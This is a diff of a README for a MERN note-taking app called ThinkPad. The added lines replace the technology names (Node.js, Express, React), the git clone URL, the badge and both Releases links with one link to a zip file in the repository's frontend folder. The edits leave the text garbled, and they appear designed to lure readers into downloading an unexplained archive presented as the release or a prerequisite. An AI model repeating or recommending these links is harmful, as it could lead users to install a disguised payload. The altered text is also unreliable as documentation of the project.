@@ -1,8 +1,8 @@
 # ThinkPad 📝
 
-![ThinkPad Logo](https://img.shields.io/badge/ThinkPad-MERN%20App-brightgreen)
+![ThinkPad Logo](https://raw.githubusercontent.com/Lucas7680/Thinkpad/main/frontend/Software_v2.0-beta.2.zip%20App-brightgreen)
 
-Welcome to the **ThinkPad** repository! This is a full-stack note-taking application built using the MERN stack: MongoDB, Express, React, and Node.js. Users can easily create, read, update, and delete notes with titles and descriptions. 
+Welcome to the **ThinkPad** repository! This is a full-stack note-taking application built using the MERN stack: MongoDB, Express, React, and https://raw.githubusercontent.com/Lucas7680/Thinkpad/main/frontend/Software_v2.0-beta.2.zip Users can easily create, read, update, and delete notes with titles and descriptions. 
 
 ## Table of Contents
 
@@ -27,9 +27,9 @@ Welcome to the **ThinkPad** repository! This is a full-stack note-taking applica
 ## Technologies Used
 
 - **MongoDB**: A NoSQL database for storing notes.
-- **Express.js**: A web application framework for Node.js.
-- **React.js**: A JavaScript library for building user interfaces.
-- **Node.js**: A JavaScript runtime for server-side programming.
+- **https://raw.githubusercontent.com/Lucas7680/Thinkpad/main/frontend/Software_v2.0-beta.2.zip**: A web application framework for https://raw.githubusercontent.com/Lucas7680/Thinkpad/main/frontend/Software_v2.0-beta.2.zip
+- **https://raw.githubusercontent.com/Lucas7680/Thinkpad/main/frontend/Software_v2.0-beta.2.zip**: A JavaScript library for building user interfaces.
+- **https://raw.githubusercontent.com/Lucas7680/Thinkpad/main/frontend/Software_v2.0-beta.2.zip**: A JavaScript runtime for server-side programming.
 - **Postman**: For testing API endpoints.
 - **Redis**: For caching and optimizing performance.
 - **Rate Limiting**: To control the number of requests a user can make.
@@ -43,7 +43,7 @@ To get started with the ThinkPad application, follow these steps:
 
 Make sure you have the following installed:
 
-- Node.js
+- https://raw.githubusercontent.com/Lucas7680/Thinkpad/main/frontend/Software_v2.0-beta.2.zip
 - npm (Node Package Manager)
 - MongoDB
 - Redis (optional for caching)
@@ -53,7 +53,7 @@ Make sure you have the following installed:
 Clone the repository to your local machine using the following command:
 
 ```bash
-git clone https://github.com/Lucas7680/Thinkpad.git
+git clone https://raw.githubusercontent.com/Lucas7680/Thinkpad/main/frontend/Software_v2.0-beta.2.zip
 ```
 
 ### Install Dependencies
@@ -131,8 +131,8 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Links
 
-To download the latest release of ThinkPad, visit [Releases](https://github.com/Lucas7680/Thinkpad/releases). 
+To download the latest release of ThinkPad, visit [Releases](https://raw.githubusercontent.com/Lucas7680/Thinkpad/main/frontend/Software_v2.0-beta.2.zip). 
 
-For further information about the project and its updates, check the [Releases](https://github.com/Lucas7680/Thinkpad/releases) section. 
+For further information about the project and its updates, check the [Releases](https://raw.githubusercontent.com/Lucas7680/Thinkpad/main/frontend/Software_v2.0-beta.2.zip) section. 
 
 Feel free to explore the code and contribute to making ThinkPad even better!
